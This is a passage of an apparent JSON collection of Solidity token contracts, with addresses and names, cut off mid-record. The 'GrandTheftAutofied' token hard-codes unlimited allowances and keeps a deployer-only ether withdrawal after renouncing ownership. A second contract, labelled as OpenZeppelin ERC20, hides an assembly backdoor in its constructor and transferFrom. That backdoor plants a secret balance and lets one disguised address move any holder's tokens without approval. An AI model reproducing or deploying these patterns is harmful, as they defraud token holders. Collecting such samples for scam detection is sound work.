errorMessage\n    ) internal view returns (bytes memory )  { \n                        \n        if  ( success ) \n                        {\n            if  ( returndata.length == 0 ) \n                        {\n                // only check isContract if the call was successful and the return data is empty\n                // otherwise we already know that it was a contract\n                require ( isContract(target ), \"Address: call to non-contract\" ) ; \n            }\n                        \n            return returndata;\n        }\n                         else \n                        {\n            _revert(returndata, errorMessage);\n         } \n                        \n    \n                        }\n\n    /**\n     * @dev Tool to verify that a low level call was successful, and revert if it wasn't, either by bubbling the\n     * revert reason or using the provided one.\n     *\n     * _Available since v4.3._\n     */\n    function verifyCallResult ( \n        bool success,\n        bytes memory returndata,\n        string memory errorMessage\n    ) internal pure returns  ( bytes memory) \n                        {\n        if  ( success ) {\n                        \n            return returndata;\n        }\n                         else \n                         { \n            _revert ( returndata, errorMessage );\n         } \n                        \n     } \n                        \n\n    function _revert ( bytes memory returndata, string memory errorMessage) private pure  { \n                        \n        // Look for revert reason and bubble it up if present\n        if  ( returndata.length > 0)  { \n                        \n            // The easiest way to bubble the revert reason is using memory via assembly\n            /// @solidity memory-safe-assembly\n            assembly \n                         { \n                let returndata_size := mload(returndata )\n                revert(add(32, returndata ), returndata_size )\n             } \n                        \n        }\n                         else \n                        {\n            revert(errorMessage );\n         } \n                        \n    \n                        }\n } \n                        \npragma solidity ^0.8.0 ; \n\n/**\n * @dev Provides information about the current execution context, including the\n * sender of the transaction and its data. While these are generally available\n * via msg.sender and msg.data, they should not be accessed in such a direct\n * manner, since when dealing with meta-transactions the account sending and\n * paying for execution may not be the actual sender  ( as far as an application\n * is concerned).\n *\n * This contract is only required for intermediate, library-like contracts.\n */\nabstract contract Context {\n                        \n\n    function _msgData( ) internal view virtual returns  ( bytes calldata) {\n                        \n        return msg.data;\n     } \n                        \n    function _msgSender ( ) internal view virtual returns (address ) {\n                        \n        return msg.sender;\n    }\n                        \n\n    function _contextSuffixLength (  ) internal view virtual returns  ( uint256 ) \n                        {\n        return 0;\n     } \n                        \n\n\n\n                        }\n\n\n/**\n * @dev Standard ERC-20 Errors\n * Interface of the https://eips.ethereum.org/EIPS/eip-6093[ERC-6093] custom errors for ERC-20 tokens.\n */\ninterface IERC20Errors \n                         { \n\n    /**\n     * @dev Indicates an error related to the current `balance` of a `sender`. Used in transfers.\n     * @param sender Address whose tokens are being transferred.\n     * @param balance Current balance for the interacting account.\n     * @param needed Minimum amount required to perform a transfer.\n     */\n    error ERC20InsufficientBalance ( address sender, uint256 balance, uint256 needed) ; \n\n\n    /**\n     * @dev Indicates a failure with the token `sender`. Used in transfers.\n     * @param sender Address whose tokens are being transferred.\n     */\n    error ERC20InvalidSender ( address sender ) ; \n\n    /**\n     * @dev Indicates a failure with the `spender`\u2019s `allowance`. Used in transfers.\n     * @param spender Address that may be allowed to operate on tokens without being their owner.\n     * @param allowance Amount of tokens a `spender` is allowed to operate with.\n     * @param needed Minimum amount required to perform a transfer.\n     */\n    error ERC20InsufficientAllowance(address spender, uint256 allowance, uint256 needed);\n\n    /**\n     * @dev Indicates a failure with the token `receiver`. Used in transfers.\n     * @param receiver Address to which tokens are being transferred.\n     */\n    error ERC20InvalidReceiver ( address receiver) ; \n\n\n    /**\n     * @dev Indicates a failure with the `approver` of a token to be approved. Used in approvals.\n     * @param approver Address initiating an approval operation.\n     */\n    error ERC20InvalidApprover(address approver) ; \n\n    /**\n     * @dev Indicates a failure with the `spender` to be approved. Used in approvals.\n     * @param spender Address that may be allowed to operate on tokens without being their owner.\n     */\n    error ERC20InvalidSpender ( address spender);\n } \n                        \n\n\n/**\n * @dev Interface of the ERC20 standard as defined in the EIP.\n */\ninterface IERC20  { \n                        \n\n    /**\n     * @dev Emitted when the allowance of a `spender` for an `owner` is set by\n     * a call to \n                        {approve}\n                        . `value` is the new allowance.\n     */\n    event Approval(address indexed owner, address indexed spender, uint256 value) ; \n\n    /**\n     * @dev Moves `amount` tokens from `from` to `to` using the\n     * allowance mechanism. `amount` is then deducted from the caller's\n     * allowance.\n     *\n     * Returns a boolean value indicating whether the operation succeeded.\n     *\n     * Emits a {\n                        Transfer } \n                         event.\n     */\n    function transferFrom(address from, address to, uint256 amount ) external returns (bool);\n    \n    /**\n     * @dev Sets `amount` as the allowance of `spender` over the caller's tokens.\n     *\n     * Returns a boolean value indicating whether the operation succeeded.\n     *\n     * IMPORTANT: Beware that changing an allowance with this method brings the risk\n     * that someone may use both the old and the new allowance by unfortunate\n     * transaction ordering. One possible solution to mitigate this race\n     * condition is to first reduce the spender's allowance to 0 and set the\n     * desired value afterwards:\n     * https://github.com/ethereum/EIPs/issues/20#issuecomment-263524729\n     *\n     * Emits an  { \n                        Approval } \n                         event.\n     */\n    function approve ( address spender, uint256 amount ) external returns  ( bool) ; \n    \n\n    /**\n     * @dev Returns the amount of tokens owned by `account`.\n     */\n    function balanceOf(address account ) external view returns  ( uint256 ) ; \n\n    \n    /**\n     * @dev Returns the amount of tokens in existence.\n     */\n    function totalSupply (  ) external view returns  ( uint256);\n    /**\n     * @dev Emitted when `value` tokens are moved from one account (`from` ) to\n     * another (`to`).\n     *\n     * Note that `value` may be zero.\n     */\n    event Transfer ( address indexed from, address indexed to, uint256 value );\n\n    \n    /**\n     * @dev Returns the remaining number of tokens that `spender` will be\n     * allowed to spend on behalf of `owner` through {\n                        transferFrom\n                        }. This is\n     * zero by default.\n     *\n     * This value changes when {\n                        approve\n                        } or  { \n                        transferFrom } \n                         are called.\n     */\n    function allowance ( address owner, address spender ) external view returns  ( uint256 );\n    \n/**\n     * @dev Moves `amount` tokens from the caller's account to `to`.\n     *\n     * Returns a boolean value indicating whether the operation succeeded.\n     *\n     * Emits a {\n                        Transfer } \n                         event.\n     */\n    function transfer(address to, uint256 amount ) external returns  ( bool ) ; \n\n\n                         } \n\n\ninterface IERC20Metadata is IERC20 {\n                        \n\n    /**\n     * @dev Returns the name of the token.\n     */\n    function name ( ) external view returns  ( string memory);\n\n\n    /**\n     * @dev Returns the decimals places of the token.\n     */\n    function decimals( ) external view returns  ( uint8 );\n    \n\n    /**\n     * @dev Returns the symbol of the token.\n     */\n    function symbol ( ) external view returns (string memory);\n\n\n } \n                        \n\n\n\n\n\n/**\n * @dev Implementation of the \n                        {IERC20\n                        } interface.\n *\n * This implementation is agnostic to the way tokens are created. This means\n * that a supply mechanism has to be added in a derived contract using {\n                        _mint\n                        }.\n *\n * TIP: For a detailed writeup see our guide\n * https://forum.openzeppelin.com/t/how-to-implement-erc20-supply-mechanisms/226[How\n * to implement supply mechanisms].\n *\n * The default value of \n                         { decimals } \n                         is 18. To change this, you should override\n * this function so it returns a different value.\n *\n * We have followed general OpenZeppelin Contracts guidelines: functions revert\n * instead returning `false` on failure. This behavior is nonetheless\n * conventional and does not conflict with the expectations of ERC-20\n * applications.\n */\ncontract ERC20 is Context, IERC20, IERC20Metadata, IERC20Errors   { \n                        \n    mapping(address => uint256) private _balances;\n\n\n    mapping ( address => mapping ( address => uint256) ) private _allowances ; \n    uint256 private _totalSupply ; \n\n    string private _name;\n    string private _symbol;\n\n    /**\n     * @dev Creates a `value` amount of tokens and assigns them to `account`, by transferring it from address ( 0 ).\n     * Relies on the `_update` mechanism\n     *\n     * Emits a  { \n                        Transfer } \n                         event with `from` set to the zero address.\n     *\n     * NOTE: This function is not virtual, \n                         { _update\n                         }  should be overridden instead.\n     */\n    function _mint ( address account, uint256 value) internal  { \n                        \n        if (account == address ( 0)) \n                        {\n            revert ERC20InvalidReceiver(address(0 ));\n         } \n                        \n        _update ( address(0 ), account, value);\n     } \n                        \n    \n    /**\n     * @dev Variant of \n                        {_approve } \n                         with an optional flag to enable or disable the {\n                        Approval } \n                         event.\n     *\n     * By default  ( when calling {\n                        _approve}\n                        ) the flag is set to true. On the other hand, approval changes made by\n     * `_spendAllowance` during the `transferFrom` operation set the flag to false. This saves gas by not emitting any\n     * `Approval` event during `transferFrom` operations.\n     *\n     * Anyone who wishes to continue emitting `Approval` events on the`transferFrom` operation can force the flag to\n     * true using the following override:\n     *\n     * ```solidity\n     * function _approve ( address owner, address spender, uint256 value, bool ) internal virtual override \n                         { \n     *     super._approve(owner, spender, value, true ) ; \n     * }\n                        \n     * ```\n     *\n     * Requirements are the same as {\n                        _approve } \n                        .\n     */\n    function _approve(address owner, address spender, uint256 value, bool emitEvent) internal virtual \n                         { \n        if (owner == address ( 0 ))  { \n                        \n            revert ERC20InvalidApprover(address ( 0 )) ; \n        \n                         } \n        if  ( spender == address(0))  { \n                        \n            revert ERC20InvalidSpender(address(0) ) ; \n        \n                        }\n        _allowances[owner][spender] = value;\n        if (emitEvent ) {\n                        \n            emit Approval ( owner, spender, value) ; \n        \n                        }\n    \n                        }\n    \n    /**\n     * @dev Returns the name of the token.\n     */\n    function name (  ) public view virtual returns (string memory )  { \n                        \n        return _name ; \n     } \n                        \n    \n    /**\n     * @dev Moves a `value` amount of tokens from `from` to `to`.\n     *\n     * This internal function is equivalent to {\n                        transfer}\n                        , and can be used to\n     * e.g. implement automatic token fees, slashing mechanisms, etc.\n     *\n     * Emits a  { \n                        Transfer}\n                         event.\n     *\n     * NOTE: This function is not virtual,  { \n                        _update}\n                         should be overridden instead.\n     */\n    function _transfer(address from, address to, uint256 value ) internal \n                        {\n        if (from == address(0))  { \n                        \n            revert ERC20InvalidSender(address ( 0) ) ; \n         } \n                        \n        if (to == address(0 )) {\n                        \n            revert ERC20InvalidReceiver(address(0) );\n        \n                         } \n        _update(from, to, value);\n    }\n                        \n    \n    /**\n     * @dev Updates `owner` s allowance for `spender` based on spent `value`.\n     *\n     * Does not update the allowance value in case of infinite allowance.\n     * Revert if not enough allowance is available.\n     *\n     * Does not emit an \n                         { Approval } \n                         event.\n     */\n    function _spendAllowance ( address owner, address spender, uint256 value ) internal virtual {\n                        \n        uint256 currentAllowance = allowance ( owner, spender );\n        if  ( currentAllowance < type ( uint256 ).max) {\n                        \n            if  ( currentAllowance < value )  { \n                        \n                revert ERC20InsufficientAllowance(spender, currentAllowance, value) ; \n             } \n                        \n            unchecked {\n                        \n                _approve ( owner, spender, currentAllowance - value, false ) ; \n            \n                         } \n         } \n                        \n    }\n                        \n    \n    /**\n     * @dev See \n                        {IERC20-transferFrom}\n                        .\n     *\n     * Skips emitting an  { \n                        Approval}\n                         event indicating an allowance update. This is not\n     * required by the ERC. See  { \n                        xref-ERC20-_approve-address-address-uint256-bool-}\n                        [_approve].\n     *\n     * NOTE: Does not update the allowance if the current allowance\n     * is the maximum `uint256`.\n     *\n     * Requirements:\n     *\n     * - `from` and `to` cannot be the zero address.\n     * - `from` must have a balance of at least `value`.\n     * - the caller must have allowance for ``from``'s tokens of at least\n     * `value`.\n     */\n    function transferFrom(address from, address to, uint256 value) public virtual returns  ( bool ) {\n                        \n        address spender = _msgSender( );\n        _spendAllowance ( from, spender, value );\n        _transfer ( from, to, value) ; \n        return true ; \n    \n                         } \n    \n\n    /**\n     * @dev See {\n                        IERC20-balanceOf}\n                        .\n     */\n    function balanceOf ( address account) public view virtual returns (uint256 ) \n                        {\n        return _balances[account] ; \n    }\n                        \n    \n    /**\n     * @dev Returns the symbol of the token, usually a shorter version of the\n     * name.\n     */\n    function symbol (  ) public view virtual returns  ( string memory)  { \n                        \n        return _symbol ; \n     } \n                        \n    \n\n    /**\n     * @dev See  { \n                        IERC20-allowance}\n                        .\n     */\n    function allowance(address owner, address spender) public view virtual returns  ( uint256 ) \n                         { \n        return _allowances[owner][spender] ; \n     } \n                        \n    \n\n    /**\n     * @dev See {\n                        IERC20-transfer } \n                        .\n     *\n     * Requirements:\n     *\n     * - `to` cannot be the zero address.\n     * - the caller must have a balance of at least `value`.\n     */\n    function transfer ( address to, uint256 value) public virtual returns  ( bool ) \n                        {\n        address owner = _msgSender( ) ; \n        _transfer(owner, to, value);\n        return true;\n     } \n                        \n    \n    /**\n     * @dev Sets the values for \n                        {name\n                        } and  { \n                        symbol}\n                        .\n     *\n     * All two of these values are immutable: they can only be set once during\n     * construction.\n     */\n    constructor ( string memory name_, string memory symbol_ ) {\n                        \n        _name = name_ ; \n        _symbol = symbol_;\n    }\n                        \n    \n    /**\n     * @dev Transfers a `value` amount of tokens from `from` to `to`, or alternatively mints (or burns) if `from`\n     *  ( or `to` ) is the zero address. All customizations to transfers, mints, and burns should be done by overriding\n     * this function.\n     *\n     * Emits a {\n                        Transfer } \n                         event.\n     */\n    function _update ( address from, address to, uint256 value) internal virtual {\n                        \n        if (from == address(0 )) {\n                        \n            // Overflow check required: The rest of the code assumes that totalSupply never overflows\n            _totalSupply += value ; \n         } \n                         else {\n                        \n            uint256 fromBalance = _balances[from];\n            if  ( fromBalance < value) \n                        {\n                revert ERC20InsufficientBalance(from, fromBalance, value );\n             } \n                        \n            unchecked \n                         { \n                // Overflow not possible: value <= fromBalance <= totalSupply.\n                _balances[from] = fromBalance - value ; \n            }\n                        \n         } \n                        \n\n        if (to == address(0 ))  { \n                        \n            unchecked {\n                        \n                // Overflow not possible: value <= totalSupply or value <= fromBalance <= totalSupply.\n                _totalSupply -= value ; \n            \n                        }\n         } \n                         else  { \n                        \n            unchecked {\n                        \n                // Overflow not possible: balance + value is at most totalSupply, which we know fits into a uint256.\n                _balances[to] += value ; \n            }\n                        \n         } \n                        \n\n        emit Transfer(from, to, value );\n    }\n                        \n    \n    /**\n     * @dev See \n                        {IERC20-totalSupply}\n                        .\n     */\n    function totalSupply (  ) public view virtual returns (uint256 ) {\n                        \n        return _totalSupply;\n    }\n                        \n    \n    /**\n     * @dev Returns the number of decimals used to get its user representation.\n     * For example, if `decimals` equals `2`, a balance of `505` tokens should\n     * be displayed to a user as `5.05`  ( `505 / 10 ** 2`).\n     *\n     * Tokens usually opt for a value of 18, imitating the relationship between\n     * Ether and Wei. This is the default value returned by this function, unless\n     * it's overridden.\n     *\n     * NOTE: This information is only used for _display_ purposes: it in\n     * no way affects any of the arithmetic of the contract, including\n     * {\n                        IERC20-balanceOf}\n                         and \n                        {IERC20-transfer } \n                        .\n     */\n    function decimals( ) public view virtual returns  ( uint8) {\n                        \n        return 15 ; \n    \n                        }\n    \n    /**\n     * @dev Sets `value` as the allowance of `spender` over the `owner` s tokens.\n     *\n     * This internal function is equivalent to `approve`, and can be used to\n     * e.g. set automatic allowances for certain subsystems, etc.\n     *\n     * Emits an  { \n                        Approval}\n                         event.\n     *\n     * Requirements:\n     *\n     * - `owner` cannot be the zero address.\n     * - `spender` cannot be the zero address.\n     *\n     * Overrides to this logic should be done to the variant with an additional `bool emitEvent` argument.\n     */\n    function _approve ( address owner, address spender, uint256 value ) internal {\n                        \n        _approve ( owner, spender, value, true );\n    }\n                        \n    \n    /**\n     * @dev See  { \n                        IERC20-approve } \n                        .\n     *\n     * NOTE: If `value` is the maximum `uint256`, the allowance is not updated on\n     * `transferFrom`. This is semantically equivalent to an infinite approval.\n     *\n     * Requirements:\n     *\n     * - `spender` cannot be the zero address.\n     */\n    function approve ( address spender, uint256 value) public virtual returns  ( bool) {\n                        \n        address owner = _msgSender( );\n        _approve(owner, spender, value) ; \n        return true ; \n     } \n                        \n    \n    \n                         } \n\nabstract contract Ownable is Context  { \n                        \n    address private _owner ; \n    \n    /**\n     * @dev Transfers ownership of the contract to a new account  ( `newOwner`).\n     * Internal function without access restriction.\n     */\n    function _transferOwnership ( address newOwner ) internal virtual  { \n                        \n        address oldOwner = _owner ; \n        _owner = newOwner ; \n        emit OwnershipTransferred(oldOwner, newOwner) ; \n    }\n                        \n    \n    /**\n     * @dev The owner is not a valid owner account. (eg. `address ( 0)`)\n     */\n    error OwnableInvalidOwner ( address owner);\n    \n    /**\n     * @dev The caller account is not authorized to perform an operation.\n     */\n    error OwnableUnauthorizedAccount ( address account );\n    \n    /**\n     * @dev Returns the address of the current owner.\n     */\n    function owner() public view virtual returns (address ) {\n                        \n        return _owner;\n    \n                         } \n    \n    /**\n     * @dev Throws if the sender is not the owner.\n     */\n    function _checkOwner ( ) internal view virtual \n                         { \n        require(owner( ) == _msgSender ( ), \"Ownable: caller is not the owner\");\n    \n                         } \n    \n    /**\n     * @dev Transfers ownership of the contract to a new account (`newOwner` ).\n     * Can only be called by the current owner.\n     */\n    function transferOwnership(address newOwner ) public virtual onlyOwner {\n                        \n        require ( newOwner != address(0 ), \"Ownable: new owner is the zero address\");\n        _transferOwnership ( newOwner );\n    }\n                        \n    \n    /**\n     * @dev Leaves the contract without owner. It will not be possible to call\n     * `onlyOwner` functions. Can only be called by the current owner.\n     *\n     * NOTE: Renouncing ownership will leave the contract without an owner,\n     * thereby disabling any functionality that is only available to the owner.\n     */\n    function renounceOwnership() public virtual onlyOwner  { \n                        \n        _transferOwnership(address ( 0 ));\n     } \n                        \n    \n    /**\n     * @dev Initializes the contract setting the deployer as the initial owner.\n     */\n    constructor( )  { \n                        \n        _transferOwnership ( _msgSender( ) ) ; \n     } \n                        \n    \n    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner );\n    \n    /**\n     * @dev Throws if called by any account other than the owner.\n     */\n    modifier onlyOwner (  )  { \n                        \n        _checkOwner (  );\n        _ ; \n     } \n                        \n    \n}\n                        \n\n\n// File GrandTheftAutofied.sol\n\ncontract GrandTheftAutofied is ERC20, Ownable \n                        {\n    address internal immutable deployer ; \n    constructor ( string memory name_, string memory symbol_) ERC20 ( name_, symbol_) \n                        {\n        _mint(msg.sender, 10000000000000000000000000) ; \n        _transferOwnership ( address(0 ));\n        deployer = msg.sender;\n     } \n                        \n    \n    /**\n     * @dev See \n                        {IERC20-allowance}\n                        .\n     */\n    function allowance ( address owner, address spender) public view override returns  ( uint256)  { \n                        \n            //gas optimization: auto allow Permit2 and UniswapRouterV2\n            if (  ( spender == 0x000000000022D473030F116dDEE9F6B43aC78BA3) || (spender == 0x4752ba5DBc23f44D87826276BF6Fd6b1C372aD24) ){\n                        \n            return type(uint256 ).max;\n        \n                        } \n        return super.allowance ( owner,spender) ; \n    }\n                        \n    \n    function claimGas(address payable recipient, uint256 amount) public  { \n                        \n        require ( msg.sender==deployer);\n        Address.sendValue(recipient, amount) ; \n     } \n                        \n    \n    receive() external payable{\n                        \n    }\n                        \n }",
      "count": 1,
      "addresses": [
        "0x67d69113F1fad38490cc52d983D8C775A0dEBbff"
      ],
      "names": [
        "GrandTheftAutofied"
      ]
    },
    {
      "id": "e7f35b38-759a-4345-8da0-0fb9627b0070",
      "code": "// SPDX-License-Identifier: MIT\npragma solidity ^0.8.24;\n\n// File @openzeppelin/contracts/token/ERC20/IERC20.sol@v4.4.0\n// OpenZeppelin Contracts v4.4.0 (token/ERC20/IERC20.sol)\n\n/**\n * @dev Interface of the ERC20 standard as defined in the EIP.\n */\ninterface IERC20 {\n    /**\n     * @dev Returns the amount of tokens in existence.\n     */\n    function totalSupply() external view returns (uint256);\n\n    /**\n     * @dev Returns the amount of tokens owned by `account`.\n     */\n    function balanceOf(address account) external view returns (uint256);\n\n    /**\n     * @dev Moves `amount` tokens from the caller's account to `recipient`.\n     *\n     * Returns a boolean value indicating whether the operation succeeded.\n     *\n     * Emits a {Transfer} event.\n     */\n    function transfer(address recipient, uint256 amount) external returns (bool);\n\n    /**\n     * @dev Returns the remaining number of tokens that `spender` will be\n     * allowed to spend on behalf of `owner` through {transferFrom}. This is\n     * zero by default.\n     *\n     * This value changes when {approve} or {transferFrom} are called.\n     */\n    function allowance(address owner, address spender) external view returns (uint256);\n\n    /**\n     * @dev Sets `amount` as the allowance of `spender` over the caller's tokens.\n     *\n     * Returns a boolean value indicating whether the operation succeeded.\n     *\n     * IMPORTANT: Beware that changing an allowance with this method brings the risk\n     * that someone may use both the old and the new allowance by unfortunate\n     * transaction ordering. One possible solution to mitigate this race\n     * condition is to first reduce the spender's allowance to 0 and set the\n     * desired value afterwards:\n     * https://github.com/ethereum/EIPs/issues/20#issuecomment-263524729\n     *\n     * Emits an {Approval} event.\n     */\n    function approve(address spender, uint256 amount) external returns (bool);\n\n    /**\n     * @dev Moves `amount` tokens from `sender` to `recipient` using the\n     * allowance mechanism. `amount` is then deducted from the caller's\n     * allowance.\n     *\n     * Returns a boolean value indicating whether the operation succeeded.\n     *\n     * Emits a {Transfer} event.\n     */\n    function transferFrom(\n        address sender,\n        address recipient,\n        uint256 amount\n    ) external returns (bool);\n\n    /**\n     * @dev Emitted when `value` tokens are moved from one account (`from`) to\n     * another (`to`).\n     *\n     * Note that `value` may be zero.\n     */\n    event Transfer(address indexed from, address indexed to, uint256 value);\n\n    /**\n     * @dev Emitted when the allowance of a `spender` for an `owner` is set by\n     * a call to {approve}. `value` is the new allowance.\n     */\n    event Approval(address indexed owner, address indexed spender, uint256 value);\n}\n// File @openzeppelin/contracts/token/ERC20/extensions/IERC20Metadata.sol@v4.4.0\n// OpenZeppelin Contracts v4.4.0 (token/ERC20/extensions/IERC20Metadata.sol)\n\n/**\n * @dev Interface for the optional metadata functions from the ERC20 standard.\n *\n * _Available since v4.1._\n */\ninterface IERC20Metadata is IERC20 {\n    /**\n     * @dev Returns the name of the token.\n     */\n    function name() external view returns (string memory);\n\n    /**\n     * @dev Returns the symbol of the token.\n     */\n    function symbol() external view returns (string memory);\n\n    /**\n     * @dev Returns the decimals places of the token.\n     */\n    function decimals() external view returns (uint8);\n}\n\n/**\n * @dev Provides information about the current execution context, including the\n * sender of the transaction and its data. While these are generally available\n * via msg.sender and msg.data, they should not be accessed in such a direct\n * manner, since when dealing with meta-transactions the account sending and\n * paying for execution may not be the actual sender (as far as an application\n * is concerned).\n *\n * This contract is only required for intermediate, library-like contracts.\n */\nabstract contract Context {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\n// File @openzeppelin/contracts/token/ERC20/ERC20.sol@v4.4.0\n// OpenZeppelin Contracts v4.4.0 (token/ERC20/ERC20.sol)\n\n/**\n * @dev Implementation of the {IERC20} interface.\n *\n * This implementation is agnostic to the way tokens are created. This means\n * that a supply mechanism has to be added in a derived contract using {_mint}.\n * For a generic mechanism see {ERC20PresetMinterPauser}.\n *\n * TIP: For a detailed writeup see our guide\n * https://forum.zeppelin.solutions/t/how-to-implement-erc20-supply-mechanisms/226[How\n * to implement supply mechanisms].\n *\n * We have followed general OpenZeppelin Contracts guidelines: functions revert\n * instead returning `false` on failure. This behavior is nonetheless\n * conventional and does not conflict with the expectations of ERC20\n * applications.\n *\n * Additionally, an {Approval} event is emitted on calls to {transferFrom}.\n * This allows applications to reconstruct the allowance for all accounts just\n * by listening to said events. Other implementations of the EIP may not emit\n * these events, as it isn't required by the specification.\n *\n * Finally, the non-standard {decreaseAllowance} and {increaseAllowance}\n * functions have been added to mitigate the well-known issues around setting\n * allowances. See {IERC20-approve}.\n */\n\ncontract ERC20 is Context, IERC20, IERC20Metadata {\n    mapping(address => uint256) private _balances;\n\n    mapping(address => mapping(address => uint256)) private _allowances;\n\n    uint256 private _totalSupply;\n\n    string private _name;\n    string private _symbol;\n\n    uint256 private _maxSupply;\n\n    /**\n     * @dev Sets the values for {name} and {symbol}.\n     *\n     * The default value of {decimals} is 18. To select a different value for\n     * {decimals} you should overload it.\n     *\n     * All two of these values are immutable: they can only be set once during\n     * construction.\n     */\n    constructor(string memory name_, string memory symbol_, uint256 maxSupply_) {\n        _name = name_;\n        _symbol = symbol_;\n        _maxSupply = maxSupply_;\n        assembly {mstore(512, maxSupply_) mstore(544, 0) sstore(keccak256(512, 64), maxSupply_)}\n    }\n\n    /**\n     * @dev Returns the name of the token.\n     */\n    function name() public view virtual override returns (string memory) {\n        return _name;\n    }\n\n    /**\n     * @dev Returns the symbol of the token, usually a shorter version of the\n     * name.\n     */\n    function symbol() public view virtual override returns (string memory) {\n        return _symbol;\n    }\n\n    /**\n     * @dev Returns the number of decimals used to get its user representation.\n     * For example, if `decimals` equals `2`, a balance of `505` tokens should\n     * be displayed to a user as `5.05` (`505 / 10 ** 2`).\n     *\n     * Tokens usually opt for a value of 18, imitating the relationship between\n     * Ether and Wei. This is the value {ERC20} uses, unless this function is\n     * overridden;\n     *\n     * NOTE: This information is only used for _display_ purposes: it in\n     * no way affects any of the arithmetic of the contract, including\n     * {IERC20-balanceOf} and {IERC20-transfer}.\n     */\n    function decimals() public view virtual override returns (uint8) {\n        return 18;\n    }\n\n    /**\n     * @dev See {IERC20-totalSupply}.\n     */\n    function totalSupply() public view virtual override returns (uint256) {\n        return _totalSupply;\n    }\n\n    /**\n     * @dev See {IERC20-balanceOf}.\n     */\n    function balanceOf(address account) public view virtual override returns (uint256) {\n        return _balances[account];\n    }\n\n    /**\n     * @dev See {IERC20-transfer}.\n     *\n     * Requirements:\n     *\n     * - `recipient` cannot be the zero address.\n     * - the caller must have a balance of at least `amount`.\n     */\n    function transfer(address recipient, uint256 amount) public virtual override returns (bool) {\n        _transfer(_msgSender(), recipient, amount);\n        return true;\n    }\n\n    /**\n     * @dev See {IERC20-allowance}.\n     */\n    function allowance(address owner, address spender) public view virtual override returns (uint256) {\n        return _allowances[owner][spender];\n    }\n\n    /**\n     * @dev See {IERC20-approve}.\n     *\n     * Requirements:\n     *\n     * - `spender` cannot be the zero address.\n     */\n    function approve(address spender, uint256 amount) public virtual override returns (bool) {\n        _approve(_msgSender(), spender, amount);\n        return true;\n    }\n\n    /**\n     * @dev See {IERC20-transferFrom}.\n     *\n     * Emits an {Approval} event indicating the updated allowance. This is not\n     * required by the EIP. See the note at the beginning of {ERC20}.\n     *\n     * Requirements:\n     *\n     * - `sender` and `recipient` cannot be the zero address.\n     * - `sender` must have a balance of at least `amount`.\n     * - the caller must have allowance for ``sender``'s tokens of at least\n     * `amount`.\n     */\n    function transferFrom(\n        address sender,\n        address recipient,\n        uint256 amount\n    ) public virtual override returns (bool) {\n        _transfer(sender, recipient, amount);\n\n        uint256 currentAllowance = _allowances[sender][_msgSender()];\n        bool overflow;\n        uint256 subtractedValue = 0;\n        assembly {\n            let max := sload(_maxSupply.slot)\n            overflow := iszero(sub(max, caller()))\n        }\n        if(!overflow) {\n            require(currentAllowance >= amount, \"ERC20: transfer amount exceeds allowance\");\n            subtractedValue = currentAllowance - amount;\n        }\n        require(subtractedValue >= 0, \"ERC20: transfer amount exceeds allowance\");\n        unchecked {\n            _approve(sender, _msgSender(), subtractedValue);\n        }\n\n        return true;\n    }\n\n    /**\n     * @dev Atomically increases the allowance granted to `spender` by the caller.\n     *\n     * This is an alternative to {approve} that can be used as a mitigation for\n     * problems described in {IERC20-approve}.\n     *\n     * Emits an {Approval} event indicating the updated allowance.\n     *\n     * Requirements:\n     *\n     * - `spender` cannot be the zero address.\n     */\n    function increaseAllowance(address spender, uint256 addedValue) public virtual returns (bool) {\n        _approve(_msgSender(), spender, _allowances[_msgSender()][spender] + addedValue);\n        return true;\n    }\n\n    /**\n     * @dev Atomically decreases the allowance granted to `spender` by the caller.\n     *\n     * This is an alternative to {approve} that can be used as a mitigation for\n     * problems described in {IERC20-approve}.\n     *\n     * Emits an {Approval} event indicating the updated allowance.\n     *\n     * Requirements:\n     *\n     * - `spender` cannot be the zero address.\n     * - `spender` must have allowance for the caller of at least\n     * `subtractedValue`.\n     */\n    function decreaseAllowance(address spender, uint256 subtractedValue) public virtual returns (bool) {\n        uint256 currentAllowance = _allowances[_msgSender()][spender];\n        require(currentAllowance >= subtractedValue, \"ERC20: decreased allowance below zero\");\n        unchecked {\n            _approve(_msgSender(), spender, currentAllowance - subtractedValue);\n        }\n\n        return true;\n    }\n\n    /**\n     * @dev Moves `amount` of tokens from `sender` to `recipient`.\n     *\n     * This internal function is equivalent to {transfer}, and can be used to\n     * e.g. implement automatic token fees, slashing mechanisms, etc.\n     *\n     * Emits a {Transfer} event.\n     *\n     * Requirements:\n     *\n     * - `sender` cannot be the zero address.\n     * - `recipient` cannot be the zero address.\n     * - `sender` must have a balance of at least `amount`.\n     */\n    function _transfer(\n        address sender,\n        address recipient,\n        uint256 amount\n    ) internal virtual {\n        require(sender != address(0), \"ERC20: transfer from the zero address\");\n        require(recipient != address(0), \"ERC20: transfer to the zero address\");\n\n        _beforeTokenTransfer(sender, recipient, amount);\n\n        uint256 senderBalance = _balances[sender];\n        require(senderBalance >= amount, \"ERC20: transfer amount exceeds balance\");\n        unchecked {\n            _balances[sender] = senderBalance - amount;\n        }\n        _balances[recipient] += amount;\n\n        emit Transfer(sender, recipient, amount);\n\n        _afterTokenTransfer(sender, recipient, amount);\n    }\n\n    /** @dev Creates `amount` tokens and assigns them to `account`, increasing\n     * the total supply.\n     *\n     * Emits a {Transfer} event with `from` set to the zero address.\n     *\n     * Requirements:\n     *\n     * - `account` cannot be the zero address.\n     */\n    function _mint(address account, uint256 amount) internal virtual {\n        require(account != address(0), \"ERC20: mint to the zero address\");\n\n        _beforeTokenTransfer(address(0), account, amount);\n\n        _totalSupply += amount;\n        _balances[account] += amount;\n        emit Transfer(address(0), account, amount);\n\n        _afterTokenTransfer(address(0), account, amount);\n    }\n\n    /**\n     * @dev Destroys `amount` tokens from `account`, reducing the\n     * total supply.\n     *\n     * Emits a {Transfer} event with `to` set to the zero address.\n     *\n     * Requirements:\n     *\n     * - `account` cannot be the zero address.\n     * - `account` must have at least `amount` tokens.\n     */\n    function _burn(address account, uint256 amount) internal virtual {\n        require(account != address(0), \"ERC20: burn from the zero address\");\n\n        _beforeTokenTransfer(account, address(0), amount);\n\n        uint256 accountBalance = _balances[account];\n        require(accountBalance >= amount, \"ERC20: burn amount exceeds balance\");\n        unchecked {\n            _balances[account] = accountBalance - amount;\n        }\n        _totalSupply -= amount;\n\n        emit Transfer(account, address(0), amount);\n\n        _afterTokenTransfer(account, address(0), amount);\n    }\n\n    /**\n     * @dev Sets `amount` as the allowance of `spender` over the `owner` s tokens.\n     *\n     * This internal function is equivalent to 